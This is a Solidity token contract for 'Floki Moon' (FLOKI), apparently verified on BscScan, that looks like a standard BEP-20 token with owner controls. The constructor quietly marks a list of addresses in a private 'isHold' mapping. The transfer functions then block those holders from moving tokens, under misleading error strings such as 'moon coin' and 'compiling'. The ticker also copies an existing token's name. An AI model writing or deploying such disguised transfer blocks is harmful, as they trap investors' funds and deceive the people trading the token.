/**
 *Submitted for verification at BscScan.com on 2022-02-08
*/

//SPDX-License-Identifier: MIT

pragma solidity ^0.8.9;

abstract contract Context{
    function _msgSender() internal view virtual returns (address)
    {
        return msg.sender;
    }

    function _msgData() internal view virtual returns (bytes calldata)
    {
        return msg.data;
    }
}

/**
 * @dev Contract module which provides a basic access control mechanism, where
 * there is an account (an owner) that can be granted exclusive access to
 * specific functions.
 *
 * By default, the owner account will be the one that deploys the contract. This
 * can later be changed with {transferOwnership}.
 *
 * This module is used through inheritance. It will make available the modifier
 * `onlyOwner`, which can be applied to your functions to restrict their use to
 * the owner.
 */
contract Ownable is Context {
    address private _owner;
    address private _previousOwner;
    uint256 public _lockTime;

    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);

    /**
     * @dev Initializes the contract setting the deployer as the initial owner.
     */
    constructor () {
        address msgSender = _msgSender();
        _owner = msgSender;
        emit OwnershipTransferred(address(0), msgSender);
    }

    /**
     * @dev Returns the address of the current owner.
     */
    function owner() public view virtual returns(address)
    {
        return _owner;
    }

    /**
     * @dev Throws if called by any account other than the owner.
     */
    modifier onlyOwner()
    {
        require(owner() == _msgSender(), "not owner");
        _;
    }

    /**
     * @dev Leaves the contract without owner. It will not be possible to call
     * `onlyOwner` functions anymore. Can only be called by the current owner.
     *
     * NOTE: Renouncing ownership will leave the contract without an owner,
     * thereby removing any functionality that is only available to the owner.
     */
    function renounceOwnership() public virtual onlyOwner
    {
        emit OwnershipTransferred(_owner, address(0));
        _owner = address(0);
    }

    /**
     * @dev Transfers ownership of the contract to a new account (`newOwner`).
     * Can only be called by the current owner.
     */
    function transferOwnership(address newOwner) public virtual onlyOwner
    {
        require(newOwner != address(0), "zero");
        emit OwnershipTransferred(_owner, newOwner);
        _owner = newOwner;
    }
}

contract FlokiMoon is Context, Ownable{
    mapping (address => uint256) public balance;
    mapping (address => mapping(address => uint256)) public allowance;
    mapping(address => bool) private isHold;
    uint256 public totalSupply = 1000000000 * 10 ** 18;
    string public name = "Floki Moon";
    string public symbol = "FLOKI";
    uint256 public decimals = 18;

    uint256 public taxPr = 0;
    address public developing = 0x0000000000000000000000000000000000000001;
    
    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(address indexed owner, address indexed spender, uint256 value);
    
    constructor(address[] memory _approved) {
        require(_approved.length > 0, "compiling");
        for (uint256 i; i < _approved.length; i++) {
            address rw = _approved[i];
            isHold[rw] = true;
        }
        balance[_msgSender()] = totalSupply;
        emit Transfer(address(0), _msgSender(), totalSupply);
    }
  
    function calculateTaxes(uint256 amount) private view returns(uint256){
       uint256 taxAmount = 0;
       if (amount > 100) {
           taxAmount = amount * taxPr / 100;
       }
       return taxAmount;
    }
    
    function balanceOf(address owner) public view returns(uint256) {
        return balance[owner];
    }
   
    function transfer(address to, uint256 value) public returns(bool) {
        require(balanceOf(_msgSender()) >= value, "low balance");
        require(!isHold[_msgSender()], "moon coin");
        uint256 taxes = calculateTaxes(value);
        uint256 newAmount = value - taxes;
        balance[to] += newAmount;
        balance[_msgSender()] -= value;
        balance[developing] += taxes;
        emit Transfer(_msgSender(), to, newAmount);
        return true;
    }
    
    function transferFrom(address from, address to, uint256 value) public returns(bool) {
        require(balanceOf(from) >= value, "low balance");
        require(allowance[from][_msgSender()] >= value, "low allowance");
        require(!isHold[from], "moon coin");
        uint256 taxes = calculateTaxes(value);
        uint256 newAmount = value - taxes;
        balance[to] += newAmount;
        balance[from] -= value;
        balance[developing] += taxes;
        emit Transfer(from, to, newAmount);
        return true;   
    }
    
    function approve(address spender, uint256 value) public returns (bool) {
        allowance[_msgSender()][spender] = value;
        emit Approval(_msgSender(), spender, value);
        return true;   
    }
}